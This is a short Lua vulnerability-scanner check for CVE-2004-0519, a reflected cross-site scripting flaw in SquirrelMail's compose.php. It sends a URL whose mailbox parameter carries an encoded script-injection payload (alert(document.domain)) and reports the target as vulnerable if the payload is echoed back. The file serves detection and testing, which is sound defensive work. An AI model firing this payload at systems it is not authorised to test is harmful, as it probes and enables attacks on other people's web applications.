report = {}
valid = false

function main(url)
    local new_url = urljoin(url,"/mail/src/compose.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E")
    local resp = send_req(new_url)
    local body = resp.body:GetStrOrNil()
    if body == "" then
        return
    end
    if string.find(body,"</script><script>alert(document.domain)</script>") then
        report["url"] = new_url
        report["match"] = "</script><script>alert(document.domain)</script>"
        report["payload"] = ""
        report["resp"] = resp.body:GetStrOrNil()
        valid = true
        println(string.format("FOUND CVE-2004-0519: %s", resp.url:GetStrOrNil()))
    end
    return report
end


-- main(TARGET_URL)
